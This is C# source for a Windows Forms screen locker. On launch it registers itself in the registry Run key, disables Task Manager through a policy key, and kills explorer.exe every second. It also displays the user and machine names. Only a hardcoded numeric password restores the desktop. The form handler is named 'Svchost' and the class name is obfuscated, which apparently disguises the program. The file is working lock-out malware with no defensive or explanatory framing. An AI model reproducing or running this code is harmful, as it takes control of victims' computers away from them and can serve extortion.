using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.IO;
using System.Management;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace WindowsFormsApp2
{
    public partial class ффффффффффффффффффффф : Form
    {
        

        int h = DateTime.Now.Hour;
        int m = DateTime.Now.Minute;
        int s = DateTime.Now.Second;

        string time = "";
        public ффффффффффффффффффффф()
        {
            InitializeComponent();
        }


        private void button4_Click(object sender, EventArgs e)
        {
            textBox1.Text += "1";
        }

        private void button5_Click(object sender, EventArgs e)
        {
            textBox1.Text += "2";
        }

        private void button6_Click(object sender, EventArgs e)
        {
            textBox1.Text += "3";
        }

        private void button7_Click(object sender, EventArgs e)
        {
            textBox1.Text += "4";
        }

        private void button8_Click(object sender, EventArgs e)
        {
            textBox1.Text += "5";
        }

        private void button9_Click(object sender, EventArgs e)
        {
            textBox1.Text += "6";
        }

        private void button10_Click(object sender, EventArgs e)
        {
            textBox1.Text += "7";
        }

        private void button11_Click(object sender, EventArgs e)
        {
            textBox1.Text += "8";
        }

        private void button12_Click(object sender, EventArgs e)
        {
            textBox1.Text += "9";
        }

        private void button13_Click(object sender, EventArgs e)
        {
            textBox1.Text += "0";
        }

        private void button3_Click(object sender, EventArgs e)
        {
            textBox1.Text = "";

        }
        public bool SetAutorunValue(bool autorun)
        {
            string name = "WindowsFormsApplication5";//Application name
            string ExePath = System.Windows.Forms.Application.ExecutablePath;//Current path
                                                                             //of application execution
            RegistryKey reg;//Class for working with Windows registry
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");//Subkey creating in registry
            try
            {
                if (autorun)
                {
                    reg.SetValue(name, ExePath);//If success - then set an autoran key values
                                                //according to this application
                }
                else
                {
                    reg.DeleteValue(name);//If failed - delete a created key
                }
                reg.Close();//Write data to registry and close it
            }
            catch
            {
                return false;//If exception (fail)
            }
            return true;//If success
        }



        public static void Disabletaskmgr(bool val)
        {
            if (val == true)
            {
                RegistryKey saveKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                saveKey.SetValue("DisableTaskMgr", "1");
                saveKey.Close();
            }
            else
            {
                RegistryKey Deletekey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                Deletekey.DeleteValue("DisableTaskMgr");
                Deletekey.Close();
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "26381234")
            {

                Process.Start("explorer"); // starting explorer
                SetAutorunValue(false); // disabling autorun
                MessageBox.Show("If explorer dont run - run it manuality or reboot pc.");
                Application.Exit(); // closing

                Disabletaskmgr(false);
            }
            else
            {
                textBox1.Text = "Неверный пароль";
            }
        }

        private void Svchost_Load(object sender, EventArgs e)
        {
            timer1.Enabled = true;
            label4.Text = Environment.UserName;
            label8.Text = Environment.MachineName;
            label9.Text = (" " + Environment.OSVersion);
            label10.Text = ("Секунд с момента запуска системы:      " + Environment.TickCount);
            SetAutorunValue(true);
            Disabletaskmgr(true);
            timer2.Interval = 1000;
            timer2.Tick += new EventHandler(timer1_Tick);
            timer2.Start();
            
            




            /*    RegistryKey saveKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                saveKey2.SetValue("DisableRegistryTools", "1");
                saveKey2.Close(); */
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Process[] procs = Process.GetProcessesByName("explorer");
            foreach (Process p in procs)
            {
                p.Kill();
            }
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            string time = "";
            int h = DateTime.Now.Hour;
            int m = DateTime.Now.Minute;
            int s = DateTime.Now.Second;

            if (h < 10)
            {
                time += "0" + h;
            }
            else
            {
                time += h;
            }

            time += ":";

            if (m < 10)
            {
                time += "0" + m;
            }
            else
            {
                time += m;
            }

            time += ":";

            if (s < 10)
            {
                time += "0" + s;
            }
            else
            {
                time += s;
            }
            time += ":";
            label11.Text = time;
        }
    }
}

